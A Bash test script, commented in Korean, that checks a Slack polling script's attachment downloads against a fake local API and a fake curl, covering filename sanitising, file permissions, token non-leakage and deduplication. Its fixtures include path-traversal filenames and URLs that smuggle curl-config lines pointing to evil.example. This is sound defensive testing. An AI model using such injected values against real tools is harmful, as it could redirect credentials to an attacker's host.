#!/usr/bin/env bash
# slack_poll.sh 첨부 내려받기 검증. 가짜 Slack API(로컬 HTTP)와 가짜 curl 만 사용하며 실제 Slack·토큰·네트워크는 쓰지 않음.
# 임시 폴더(mktemp -d) 안에서만 읽고 쓰며 종료 시 정리함.
set -uo pipefail

HERE=$(cd "$(dirname "$0")" && pwd -P)
POLL="$HERE/../../hubs/scripts/slack_poll.sh"
PASS=0 FAIL=0
ok() { PASS=$((PASS + 1)); printf 'PASS  %s\n' "$1"; }
ko() { FAIL=$((FAIL + 1)); printf 'FAIL  %s — %s\n' "$1" "${2:-}"; }

SB=$(mktemp -d "${TMPDIR:-/tmp}/cc-slackpoll.XXXXXX")
SRV=""
trap '[ -n "$SRV" ] && { kill "$SRV"; wait "$SRV"; } 2>/dev/null; rm -rf "${SB:?}"' EXIT
H="$SB/hub" FIX="$SB/fix" LOG="$SB/log" BIN="$SB/bin"
mkdir -p "$H" "$FIX" "$LOG" "$BIN"
cp "$HERE/fake_curl.sh" "$BIN/curl"; chmod 755 "$BIN/curl"
printf '%s' "$LOG" > "$BIN/curl.logdir"  # 가짜 curl 은 환경 변수를 못 받으므로(허용 목록) 기록 폴더를 파일로 알림

FAKE_TOKEN="fake-token-0123456789-abcdefghij"
ME=Uuser1; BOT=Ubot1
# APP_SECRET_FAKE: 허용 목록 밖 비밀이 curl 환경으로 새지 않는지 보는 시험용 값
printf 'SLACK_BOT_TOKEN=%s\nSLACK_USER_ID=%s\nexport APP_SECRET_FAKE=fake-other-secret-9876\n' "$FAKE_TOKEN" "$ME" > "$H/slack-bot.env"

N=$(date +%s)
LONG=$(printf 'x%.0s' $(seq 1 150))
file() { # id name user url [mimetype]
  printf '{"id":"%s","name":"%s","user":"%s","url_private_download":"%s","size":10,"mimetype":"%s"}' "$1" "$2" "$3" "$4" "${5:-application/pdf}"
}
U=https://files.slack.com/files-pri/T1
F_OK=$(file Fuser1 '../../evil name.pdf' $ME "$U-Fuser1/dl")
F_BOT=$(file Fbot1 bot.png $BOT "$U-Fbot1/dl")
F_FAIL=$(file Ffail1 f.pdf $ME "$U-Ffail1/fail")
F_HTML=$(file Fhtml1 h.pdf $ME "$U-Fhtml1/login")
F_LONG=$(file Flong1 "$LONG.png" $ME "$U-Flong1/dl" image/png)
F_DOT=$(file Fdot1 '.bad\u0007name.txt' $ME "$U-Fdot1/dl" text/plain)
F_REPLY=$(file Freply1 '보고서 최종.pdf' $ME "$U-Freply1/dl")
F_REPLY_BOT=$(file Freplybot1 b.pdf $BOT "$U-Freplybot1/dl")
F_BOTMSG=$(file Fbotmsg1 m.pdf $BOT "$U-Fbotmsg1/dl")

cat > "$FIX/conversations.open.json" <<EOF
{"ok":true,"channel":{"id":"Dfake"}}
EOF
cat > "$FIX/conversations.history.json" <<EOF
{"ok":true,"messages":[
 {"ts":"$N.000100","user":"$ME","subtype":"file_share","text":"첨부","files":[$F_OK,$F_BOT,$F_FAIL,$F_HTML,$F_LONG,$F_DOT]},
 {"ts":"$N.000200","user":"$BOT","bot_id":"B1","text":"bot file","files":[$F_BOTMSG]},
 {"ts":"$N.000300","user":"$BOT","bot_id":"B1","text":"결정 필요","reply_count":1,"latest_reply":"$N.000400"},
 {"ts":"$N.000500","user":"$ME","text":"그냥 메모"}
]}
EOF
cat > "$FIX/conversations.replies.json" <<EOF
{"ok":true,"messages":[
 {"ts":"$N.000300","user":"$BOT","bot_id":"B1","text":"결정 필요"},
 {"ts":"$N.000400","user":"$ME","subtype":"file_share","text":"답글","files":[$F_REPLY]},
 {"ts":"$N.000450","user":"$BOT","bot_id":"B1","text":"bot reply","files":[$F_REPLY_BOT]}
]}
EOF
printf '{"ts":"%s.000300","at":%s,"title":"결정 1","tag":"t"}\n' "$N" "$N" > "$H/slack-sent.jsonl"

python3 -I "$HERE/fake_slack.py" "$FIX" "$SB/port" &
SRV=$!
for _ in $(seq 1 50); do [ -s "$SB/port" ] && break; sleep 0.1; done
[ -s "$SB/port" ] || { ko "가짜 API 기동" "포트 파일 없음"; exit 1; }
API="http://127.0.0.1:$(cat "$SB/port")"

pollh() { # 허브 폴더, 출력 파일 접두사
  LRM_HUB_DIR="$1" SLACK_API_BASE="$API" PATH="$BIN:$PATH" bash "$POLL" --once > "$SB/$2.out" 2> "$SB/$2.err"
}
poll() { pollh "$H" "$1"; }
curl_calls() { wc -l < "$LOG/curl.args" | tr -d ' '; }
perm() { stat -f '%Lp' "$1" 2>/dev/null || stat -c '%a' "$1"; }
FD="$H/slack-files"
inbox_files() { jq -c --arg ts "$N.$1" 'select(.ts==$ts) | .files' "$H/slack-inbox.jsonl"; }

# ---- 1회차 -------------------------------------------------------------------
# 고정 입력의 ts 는 N 부터라 전환 시각을 그 앞으로 둠(전환 이전 메시지 건너뛰기는 아래 ⓖ 에서 따로 시험)
printf '{"file_share_since":%s}' $((N - 60)) > "$H/slack-poll-state.json"
poll r1; rc=$?
[ "$rc" = 0 ] && ok "ⓔ 일부 첨부가 실패해도 폴링 종료 코드 0" || ko "ⓔ 종료 코드" "rc=$rc"
[ "$(wc -l < "$H/slack-inbox.jsonl" | tr -d ' ')" = 3 ] && ok "ⓔ 실패 건 뒤의 메시지·스레드 답글까지 수집(레코드 3건)" || ko "ⓔ 수집 건수" "$(wc -l < "$H/slack-inbox.jsonl")"

ls "$FD" > "$SB/names.txt"
grep -qx 'Fuser1_evil_name.pdf' "$SB/names.txt" && ok "ⓐ 사용자 파일 저장(Fuser1_evil_name.pdf)" || ko "ⓐ 저장" "$(tr '\n' ' ' < "$SB/names.txt")"
[ "$(inbox_files 000100)" = "[\"$FD/Fuser1_evil_name.pdf\",\"$FD/Flong1_$(printf 'x%.0s' $(seq 1 96)).png\",\"$FD/Fdot1_badname.txt\"]" ] && ok "ⓐ 레코드 files 에 성공 경로만(실패·봇 파일 제외, 입력 순서)" || ko "ⓐ 레코드 files" "$(inbox_files 000100)"
[ "$(inbox_files 000400)" = "[\"$FD/Freply1_보고서_최종.pdf\"]" ] && ok "ⓐ 스레드 답글 첨부 저장·기록(한글 이름 유지)" || ko "ⓐ 답글 첨부" "$(inbox_files 000400)"
[ "$(jq -c 'select(.ts=="'"$N.000500"'") | has("files")' "$H/slack-inbox.jsonl")" = false ] && ok "첨부 없는 레코드는 files 키 없음(기존 모양 유지)" || ko "files 키" "첨부 없는 레코드에 생김"
[ "$(jq -c 'select(.ts=="'"$N.000500"'") | keys' "$H/slack-inbox.jsonl")" = '["channel","received_at","text","ts","type"]' ] && ok "기존 필드 이름 그대로" || ko "기존 필드" ""

[ ! -e "$FD/Fbot1_bot.png" ] && ! grep -q 'Fbot1\|Fbotmsg1\|Freplybot1' "$SB/names.txt" && ! grep -q 'Fbot1\|Fbotmsg1\|Freplybot1' "$LOG/curl.args" && ! grep -q 'Fbot1\|Fbotmsg1\|Freplybot1' "$LOG"/curl.stdin.* && ok "ⓑ 봇 파일 3종(사용자 메시지에 붙은 봇 소유·봇 메시지·봇 답글) 요청도 저장도 안 함" || ko "ⓑ 봇 파일" "받음"

longname=$(grep '^Flong1_' "$SB/names.txt")
[ "${#longname}" -le $((7 + 100)) ] && ok "ⓒ 긴 이름 100자 제한(접두사 제외)" || ko "ⓒ 길이" "${#longname}"
ls -A "$FD" | grep -E '^\.|/|\.\.' > /dev/null && ko "ⓒ 안전한 이름" "점·구분자 포함: $(ls -A "$FD" | tr '\n' ' ')" || ok "ⓒ ../ 이름·앞 점·제어 문자 정리(폴더 밖 쓰기 없음)"
[ ! -e "$H/evil name.pdf" ] && [ ! -e "$SB/evil name.pdf" ] && [ ! -e "$H/../evil name.pdf" ] && ok "ⓒ path traversal 흔적 없음" || ko "ⓒ traversal" "상위 폴더에 파일 생김"

[ "$(perm "$FD")" = 700 ] && ok "폴더 권한 700" || ko "폴더 권한" "$(perm "$FD")"
bad=""; for f in "$FD"/*; do [ "$(perm "$f")" = 600 ] || bad="$bad $f"; done
[ -z "$bad" ] && ok "파일 권한 600" || ko "파일 권한" "$bad"
[ -z "$(find "$FD" -name '.part-*')" ] && ok "임시 파일(.part-*) 남지 않음(실패 포함)" || ko "임시 파일" "남음"
[ ! -e "$FD/Fhtml1_h.pdf" ] && [ ! -e "$FD/Ffail1_f.pdf" ] && ok "로그인 HTML·curl 실패 파일은 저장 안 함" || ko "HTML·실패" "저장됨"

grep -q '첨부 내려받기 실패 3건(성공 4건)' "$SB/r1.err" && grep -q 'curl 1' "$SB/r1.err" && grep -q 'html 1' "$SB/r1.err" && grep -q 'owner 1' "$SB/r1.err" && ok "실패는 stderr 요약 한 줄(사유 코드만)" || ko "stderr 요약" "$(cat "$SB/r1.err")"
[ "$(wc -l < "$SB/r1.err" | tr -d ' ')" = 1 ] && ok "stderr 는 한 줄" || ko "stderr 줄 수" "$(wc -l < "$SB/r1.err")"

# ---- 토큰 비노출 --------------------------------------------------------------
leak=$(grep -rl -F "$FAKE_TOKEN" "$SB/r1.out" "$SB/r1.err" "$H/slack-inbox.jsonl" "$H/slack-poll-state.json" "$LOG/curl.args" "$FD" 2>/dev/null; ls "$FD" | grep -F "$FAKE_TOKEN")
[ -z "$leak" ] && ok "ⓕ 토큰이 출력·stderr·inbox·상태·curl 인자·저장 파일/이름에 없음" || ko "ⓕ 토큰 노출" "$leak"
grep -q -- '-K -' "$LOG/curl.args" && ok "ⓕ curl 은 -K - (표준입력 설정)로 호출" || ko "ⓕ -K -" ""
grep -l -F "Authorization: Bearer $FAKE_TOKEN" "$LOG"/curl.stdin.* > /dev/null && ok "ⓕ 인증 헤더는 표준입력 설정으로만 전달됨" || ko "ⓕ 인증 전달" "표준입력에 헤더 없음"
grep -qE -- '--max-filesize 26214400' "$LOG/curl.args" && grep -qE -- '--max-time [0-9]+' "$LOG/curl.args" && grep -q -- '--proto =https' "$LOG/curl.args" && ok "크기 상한 25MB·--max-time·https 만 허용" || ko "curl 제한 옵션" ""

# ---- 2회차: 같은 입력 재실행 --------------------------------------------------
calls=$(wc -l < "$LOG/curl.args" | tr -d ' ')
poll r2; rc=$?
[ "$rc" = 0 ] && [ "$(wc -l < "$LOG/curl.args" | tr -d ' ')" = "$calls" ] && [ "$(wc -l < "$H/slack-inbox.jsonl" | tr -d ' ')" = 3 ] && ok "ⓓ 재실행: 새 레코드·curl 호출 없음" || ko "ⓓ 재실행" "rc=$rc 호출 $calls→$(wc -l < "$LOG/curl.args")"
# 상태·inbox 를 비워 레코드가 다시 만들어져도 같은 file_id 는 다시 받지 않음
printf '{"file_share_since":%s}' $((N - 60)) > "$H/slack-poll-state.json"; : > "$H/slack-inbox.jsonl"
poll r3; rc=$?
[ "$rc" = 0 ] && ok "ⓓ 상태 초기화 뒤 재수집 종료 코드 0" || ko "ⓓ 재수집" "rc=$rc"
new_calls=$(( $(wc -l < "$LOG/curl.args" | tr -d ' ') - calls ))
# 성공한 4개는 이미 있어 호출 안 함. 실패했던 2개(curl·HTML)만 다시 시도
[ "$new_calls" = 2 ] && ok "ⓓ 같은 file_id 가 있으면 다시 받지 않음(재시도는 실패했던 2건만)" || ko "ⓓ 중복 방지" "추가 curl 호출 $new_calls"
[ "$(inbox_files 000400)" = "[\"$FD/Freply1_보고서_최종.pdf\"]" ] && ok "ⓓ 기존 파일 경로를 레코드에 다시 기록" || ko "ⓓ 기존 경로 기록" "$(inbox_files 000400)"

leak=$(grep -rl -F "$FAKE_TOKEN" "$SB/r2.out" "$SB/r3.out" "$SB/r3.err" "$H/slack-inbox.jsonl" "$LOG/curl.args" 2>/dev/null)
[ -z "$leak" ] && ok "ⓕ 재실행 뒤에도 토큰 노출 없음" || ko "ⓕ 재실행 토큰" "$leak"

# ---- 결함 3: 실패한 첨부는 레코드에 id·사유만 남김 ------------------------------
[ "$(jq -c 'select(.ts=="'"$N.000100"'") | .files_failed' "$H/slack-inbox.jsonl")" = '[{"id":"Fbot1","why":"owner"},{"id":"Ffail1","why":"curl"},{"id":"Fhtml1","why":"html"}]' ] && ok "ⓗ 실패한 첨부는 files_failed 에 id·사유 코드로 기록(입력 순서)" || ko "ⓗ files_failed" "$(jq -c 'select(.ts=="'"$N.000100"'") | .files_failed' "$H/slack-inbox.jsonl")"
[ "$(jq -c 'select(.ts=="'"$N.000400"'") | has("files_failed")' "$H/slack-inbox.jsonl")" = false ] && [ "$(jq -c 'select(.ts=="'"$N.000500"'") | has("files_failed")' "$H/slack-inbox.jsonl")" = false ] && ok "ⓗ 실패가 없으면 files_failed 키 없음" || ko "ⓗ files_failed 키" "실패 없는 레코드에 생김"
[ "$(jq -c '[.files_failed[]? | keys] | unique' "$H/slack-inbox.jsonl" | sort -u | tr -d '\n')" = '[["id","why"]][]' ] && ! grep -q 'files-pri\|bot.png\|f\.pdf\|h\.pdf' <(jq -c '.files_failed // empty' "$H/slack-inbox.jsonl") && ok "ⓗ files_failed 에 이름·URL 없음(id·why 만)" || ko "ⓗ files_failed 내용" "$(jq -c '.files_failed // empty' "$H/slack-inbox.jsonl" | head -3)"

# ---- 결함 7·8: curl 자식 환경은 허용 목록, 가짜 curl 이 환경을 직접 점검 -----------------
ls "$LOG"/curl.env.* > /dev/null 2>&1 && [ -z "$(cat "$LOG"/curl.env.* | grep -v '^0 0 0$')" ] && ok "ⓘ curl 환경에 토큰 값·SLACK_BOT_TOKEN·다른 비밀(APP_SECRET_FAKE) 0개" || ko "ⓘ curl 환경" "$(cat "$LOG"/curl.env.* 2>/dev/null | sort | uniq -c | tr '\n' ' ')"
extra=$(cat "$LOG"/curl.envnames.* | sort -u | grep -vxE 'PATH|HOME|SSL_CERT_FILE|LANG|LC_ALL|TMPDIR|PWD|SHLVL|OLDPWD|_')
[ -z "$extra" ] && ok "ⓘ curl 환경 변수 이름이 허용 목록(PATH·HOME·SSL_CERT_FILE·LANG·LC_ALL·TMPDIR) 안" || ko "ⓘ 허용 목록 밖 환경" "$(printf '%s ' $extra)"

# ---- 결함 1·4: 위험한 주소·시간 예산 (허브 폴더를 새로 씀) -----------------------------
FNEW() { printf '{"ok":true,"messages":[%s]}' "$1" > "$FIX/conversations.history.json"; }
mkhub() { mkdir -p "$1"; cp "$H/slack-bot.env" "$1/slack-bot.env"; printf '{"file_share_since":%s}' $((N - 60)) > "$1/slack-poll-state.json"; }
NFD='보고서.pdf'  # JSON 이스케이프로 쓴 NFD "보고서.pdf"
F_NL=$(file Fnl1 a.pdf $ME 'https://files.slack.com/a\nurl = https://evil.example/x')
F_CR=$(file Fcr1 a.pdf $ME 'https://files.slack.com/a\rheader = X-Leak: 1')
F_SP=$(file Fsp1 a.pdf $ME 'https://files.slack.com/a b')
F_QT=$(file Fqt1 a.pdf $ME 'https://files.slack.com/a\"b')
F_BS=$(file Fbs1 a.pdf $ME 'https://files.slack.com/a\\b')
F_GOOD=$(file Fgood1 g.pdf $ME "$U-Fgood1/dl")
F_NFD=$(file Fnfd1 "$NFD" $ME "$U-Fnfd1/dl")
H3="$SB/hub3"; mkhub "$H3"
FNEW "{\"ts\":\"$N.000700\",\"user\":\"$ME\",\"subtype\":\"file_share\",\"text\":\"첨부\",\"files\":[$F_NL,$F_CR,$F_SP,$F_QT,$F_BS,$F_GOOD,$F_NFD]}"
calls=$(curl_calls)
pollh "$H3" g3; rc=$?
FD3="$H3/slack-files"
[ "$rc" = 0 ] && [ "$(( $(curl_calls) - calls ))" = 2 ] && ok "ⓙ 개행·CR·공백·\"·\\ 가 든 주소는 curl 을 부르지 않음(정상 2건만 호출)" || ko "ⓙ 위험 주소" "rc=$rc 호출 $(( $(curl_calls) - calls ))"
! grep -lq 'evil.example\|X-Leak' "$LOG"/curl.stdin.* && ok "ⓙ 주입 문자열이 curl 설정에 전달된 적 없음(토큰이 다른 호스트로 안 감)" || ko "ⓙ 주입 전달" "curl 설정에 주입 문자열 있음"
[ "$(jq -c '.files_failed | map(.why) | unique' "$H3/slack-inbox.jsonl")" = '["url"]' ] && [ "$(jq -c '.files_failed | length' "$H3/slack-inbox.jsonl")" = 5 ] && ok "ⓙ 위험 주소 5건은 files_failed(url)로 기록" || ko "ⓙ files_failed url" "$(jq -c '.files_failed' "$H3/slack-inbox.jsonl")"
[ "$(jq -c '.files' "$H3/slack-inbox.jsonl")" = "[\"$FD3/Fgood1_g.pdf\",\"$FD3/Fnfd1_보고서.pdf\"]" ] && ok "ⓚ NFD 한글 이름이 NFC 로 정규화되어 저장(밑줄로 안 바뀜)" || ko "ⓚ NFD 이름" "$(jq -c '.files' "$H3/slack-inbox.jsonl")"

# 결함 4: 내려받기는 DEADLINE 앞 20초를 남김. 총 예산이 작으면 받지 않고 budget 으로 기록
F_B=$(file Fbud1 b.pdf $ME "$U-Fbud1/dl")
H4="$SB/hub4"; mkhub "$H4"
FNEW "{\"ts\":\"$N.000710\",\"user\":\"$ME\",\"subtype\":\"file_share\",\"text\":\"첨부\",\"files\":[$F_B]}"
calls=$(curl_calls)
LRM_POLL_BUDGET=15 pollh "$H4" g4; rc=$?
[ "$rc" = 0 ] && [ "$(curl_calls)" = "$calls" ] && [ "$(jq -c '.files_failed' "$H4/slack-inbox.jsonl")" = '[{"id":"Fbud1","why":"budget"}]' ] && ok "ⓛ 남은 시간 예산이 DL 여유보다 작으면 내려받지 않고 budget 기록(회차는 성공)" || ko "ⓛ 시간 예산" "rc=$rc $(jq -c '.files_failed' "$H4/slack-inbox.jsonl")"

# ---- 결함 2: 전환 이전 첨부 메시지는 기록·내려받기 없이 seen 에만 ----------------------
OLD=$((N - 259200)); PARENT=$((N - 345600))
F_OLD=$(file Fold1 o.pdf $ME "$U-Fold1/dl"); F_OLD2=$(file Fold2 o2.pdf $ME "$U-Fold2/dl")
H2="$SB/hub2"; mkdir -p "$H2"; cp "$H/slack-bot.env" "$H2/slack-bot.env"
printf '{"seen":{"msg:1.000":%s}}' "$N" > "$H2/slack-poll-state.json"  # 이미 쓰던 상태(전환 시각 없음)
printf '{"ts":"%s.000300","at":%s,"title":"결정 2","tag":"t"}\n' "$PARENT" "$N" > "$H2/slack-sent.jsonl"
FNEW "{\"ts\":\"$OLD.000100\",\"user\":\"$ME\",\"subtype\":\"file_share\",\"text\":\"PR\",\"files\":[$F_OLD]},
 {\"ts\":\"$PARENT.000300\",\"user\":\"$BOT\",\"bot_id\":\"B1\",\"text\":\"결정 필요\",\"reply_count\":1,\"latest_reply\":\"$OLD.000400\"}"
cat > "$FIX/conversations.replies.json" <<EOT
{"ok":true,"messages":[
 {"ts":"$PARENT.000300","user":"$BOT","bot_id":"B1","text":"결정 필요"},
 {"ts":"$OLD.000400","user":"$ME","subtype":"file_share","text":"대기","files":[$F_OLD2]}
]}
EOT
calls=$(curl_calls)
pollh "$H2" g2a; rc=$?
[ "$rc" = 0 ] && [ -z "$(cat "$H2/slack-inbox.jsonl" 2>/dev/null)" ] && ok "ⓜ 전환 이전 file_share(최상위·스레드 답글)는 note·command 로 기록되지 않음" || ko "ⓜ 지난 첨부 재기록" "$(cat "$H2/slack-inbox.jsonl" 2>/dev/null | head -c 300)"
[ "$(curl_calls)" = "$calls" ] && [ ! -d "$H2/slack-files" ] && ok "ⓜ 지난 첨부는 curl 0회·저장 폴더도 안 만듦" || ko "ⓜ 지난 첨부 내려받기" "호출 $(( $(curl_calls) - calls ))"
jq -e '(.seen | has("msg:'"$OLD.000100"'") and has("msg:'"$OLD.000400"'")) and (.file_share_since | type == "number")' "$H2/slack-poll-state.json" > /dev/null && ok "ⓜ 두 메시지는 seen 에 들어가고 file_share_since 가 기록됨" || ko "ⓜ 상태" "$(cat "$H2/slack-poll-state.json")"
# 전환 이후 새 메시지는 정상 기록·내려받기
sleep 1
NEW=$(date +%s)
F_N1=$(file Fnew1 n1.pdf $ME "$U-Fnew1/dl"); F_N2=$(file Fnew2 n2.pdf $ME "$U-Fnew2/dl")
FNEW "{\"ts\":\"$OLD.000100\",\"user\":\"$ME\",\"subtype\":\"file_share\",\"text\":\"PR\",\"files\":[$F_OLD]},
 {\"ts\":\"$NEW.000100\",\"user\":\"$ME\",\"subtype\":\"file_share\",\"text\":\"새 첨부\",\"files\":[$F_N1]},
 {\"ts\":\"$PARENT.000300\",\"user\":\"$BOT\",\"bot_id\":\"B1\",\"text\":\"결정 필요\",\"reply_count\":2,\"latest_reply\":\"$NEW.000400\"}"
cat > "$FIX/conversations.replies.json" <<EOT
{"ok":true,"messages":[
 {"ts":"$PARENT.000300","user":"$BOT","bot_id":"B1","text":"결정 필요"},
 {"ts":"$OLD.000400","user":"$ME","subtype":"file_share","text":"대기","files":[$F_OLD2]},
 {"ts":"$NEW.000400","user":"$ME","subtype":"file_share","text":"새 답글","files":[$F_N2]}
]}
EOT
pollh "$H2" g2b; rc=$?
FD2="$H2/slack-files"
[ "$rc" = 0 ] && [ "$(wc -l < "$H2/slack-inbox.jsonl" | tr -d ' ')" = 2 ] && [ "$(jq -c 'select(.ts=="'"$NEW.000100"'") | [.type,.files]' "$H2/slack-inbox.jsonl")" = "[\"note\",[\"$FD2/Fnew1_n1.pdf\"]]" ] && [ "$(jq -c 'select(.ts=="'"$NEW.000400"'") | [.type,.files]' "$H2/slack-inbox.jsonl")" = "[\"thread_reply\",[\"$FD2/Fnew2_n2.pdf\"]]" ] && ok "ⓜ 전환 이후 새 file_share(최상위·스레드 답글)는 정상 기록·내려받기" || ko "ⓜ 새 첨부" "$(cat "$H2/slack-inbox.jsonl" | head -c 400)"
[ ! -e "$FD2/Fold1_o.pdf" ] && [ ! -e "$FD2/Fold2_o2.pdf" ] && ok "ⓜ 지난 첨부 파일은 끝내 저장되지 않음" || ko "ⓜ 지난 첨부 저장" "저장됨"

# ---- 결함 A: since 없는 첫 회차 — 5분 여유 안의 새 첨부는 기록, 3일 전 첨부는 기록 안 함 ----------
cat > "$FIX/conversations.replies.json" <<EOT
{"ok":true,"messages":[]}
EOT
HA="$SB/hubA"; mkdir -p "$HA"; cp "$H/slack-bot.env" "$HA/slack-bot.env"
printf '{"seen":{}}' > "$HA/slack-poll-state.json"
T5=$(date +%s); T5=$((T5 - 5)); T3D=$((T5 - 259200))
F_A1=$(file Fa1 a1.pdf $ME "$U-Fa1/dl"); F_A2=$(file Fa2 a2.pdf $ME "$U-Fa2/dl")
FNEW "{\"ts\":\"$T5.000100\",\"user\":\"$ME\",\"subtype\":\"file_share\",\"text\":\"방금\",\"files\":[$F_A1]},
 {\"ts\":\"$T3D.000100\",\"user\":\"$ME\",\"subtype\":\"file_share\",\"text\":\"옛\",\"files\":[$F_A2]}"
pollh "$HA" a1; rc=$?
[ "$rc" = 0 ] && [ "$(wc -l < "$HA/slack-inbox.jsonl" | tr -d ' ')" = 1 ] && [ "$(jq -r '.ts' "$HA/slack-inbox.jsonl")" = "$T5.000100" ] && ok "ⓐA 상태 {seen:{}} + 5초 전 file_share 는 기록, 3일 전 file_share 는 기록 안 함" || ko "ⓐA 첫 회차" "rc=$rc $(head -c 300 "$HA/slack-inbox.jsonl" 2>/dev/null)"
[ -f "$HA/slack-files/Fa1_a1.pdf" ] && [ ! -e "$HA/slack-files/Fa2_a2.pdf" ] && jq -e '.seen | has("msg:'"$T3D.000100"'")' "$HA/slack-poll-state.json" > /dev/null && ok "ⓐA 5초 전 첨부만 저장, 3일 전 첨부는 seen 에만" || ko "ⓐA 저장" "$(ls "$HA/slack-files" 2>/dev/null | tr '\n' ' ')"
# 첫 회차가 API 실패를 반복해도 since 는 첫 값 그대로
HB="$SB/hubB"; mkdir -p "$HB"; cp "$H/slack-bot.env" "$HB/slack-bot.env"
cp "$FIX/conversations.open.json" "$SB/open.ok"
printf '{"ok":false,"error":"fatal_error"}' > "$FIX/conversations.open.json"
pollh "$HB" b1; rc1=$?
S1=$(jq -r '.file_share_since' "$HB/slack-poll-state.json" 2>/dev/null)
sleep 2
pollh "$HB" b2; rc2=$?
S2=$(jq -r '.file_share_since' "$HB/slack-poll-state.json" 2>/dev/null)
[ "$rc1" = 1 ] && [ "$rc2" = 1 ] && [[ "$S1" =~ ^[0-9]+$ ]] && ok "ⓐA 첫 회차가 API 실패여도 since 가 저장됨" || ko "ⓐA 실패 회차 저장" "rc=$rc1,$rc2 since='$S1'"
[ "$S1" = "$S2" ] && [[ "$S1" =~ ^[0-9]+$ ]] && [ "$S1" -le $((T5 + 10 - 300 + 5)) ] && ok "ⓐA 두 번 실패해도 since 가 첫 값 그대로이며 now-300 부근" || ko "ⓐA since 이동" "$S1 → $S2 (T5=$T5)"
cp "$SB/open.ok" "$FIX/conversations.open.json"
TB=$(date +%s); F_A3=$(file Fa3 a3.pdf $ME "$U-Fa3/dl")
FNEW "{\"ts\":\"$((TB - 1)).000100\",\"user\":\"$ME\",\"subtype\":\"file_share\",\"text\":\"장애 중\",\"files\":[$F_A3]}"
pollh "$HB" b3; rc=$?
[ "$rc" = 0 ] && [ "$(wc -l < "$HB/slack-inbox.jsonl" | tr -d ' ')" = 1 ] && [ "$(jq -r '.file_share_since' "$HB/slack-poll-state.json")" = "$S1" ] && ok "ⓐA 실패 뒤 성공 회차에서 장애 중 첨부 기록, since 유지" || ko "ⓐA 복구 회차" "rc=$rc since=$(jq -r '.file_share_since' "$HB/slack-poll-state.json")"

# ---- 결함 C: 프록시·CA 변수는 curl 환경으로 전달, 토큰·비밀은 여전히 0 ---------------------
HC="$SB/hubC"; mkdir -p "$HC"; cp "$H/slack-bot.env" "$HC/slack-bot.env"; printf '{}' > "$HC/slack-poll-state.json"
PX="HTTPS_PROXY https_proxy ALL_PROXY all_proxy NO_PROXY no_proxy CURL_CA_BUNDLE"
F_C1=$(file Fc1 c1.pdf $ME "$U-Fc1/dl")
FNEW "{\"ts\":\"$(date +%s).000100\",\"user\":\"$ME\",\"subtype\":\"file_share\",\"text\":\"프록시\",\"files\":[$F_C1]}"
before=$(curl_calls)
(for k in $PX; do export "$k=fake-$k"; done; export NO_PROXY=127.0.0.1 no_proxy=127.0.0.1; pollh "$HC" c1)
n=$(curl_calls)
miss=""; for k in $PX; do grep -qx "$k" "$LOG/curl.envnames.$n" || miss="$miss $k"; done
[ "$n" -gt "$before" ] && [ -z "$miss" ] && ok "ⓘC curl 환경에 프록시·CA 변수 7개 전달" || ko "ⓘC 프록시 변수" "누락:$miss (curl 호출 ${before}→${n})"
[ "$(cat "$LOG/curl.env.$n")" = "0 0 0" ] && ! grep -qx 'SLACK_BOT_TOKEN\|APP_SECRET_FAKE\|SLACK_USER_ID' "$LOG/curl.envnames.$n" && ok "ⓘC 프록시 변수 허용 뒤에도 토큰 값·SLACK_BOT_TOKEN·다른 비밀 0개" || ko "ⓘC 비밀 유출" "$(cat "$LOG/curl.env.$n")"

# ---- 주소 판정·curl 설정 단위 시험(+REAL_CURL=1 이면 실제 curl 과 127.0.0.1 서버 2개) -------
mode=offline; [ "${REAL_CURL:-0}" = 1 ] && mode=curl
python3 -I "$HERE/url_guard.py" "$POLL" "$mode" > "$SB/guard.out" 2>&1
guard_n=0
while IFS= read -r line; do
  case "$line" in
    "PASS  "*) guard_n=$((guard_n + 1)); ok "ⓝ[$mode] ${line#PASS  }" ;;
    "FAIL  "*) guard_n=$((guard_n + 1)); ko "ⓝ[$mode]" "${line#FAIL  }" ;;
  esac
done < "$SB/guard.out"
[ "$guard_n" -gt 0 ] || ko "ⓝ url_guard.py" "$(head -c 300 "$SB/guard.out")"

printf '\n결과: PASS %s, FAIL %s\n' "$PASS" "$FAIL"
[ "$FAIL" = 0 ]
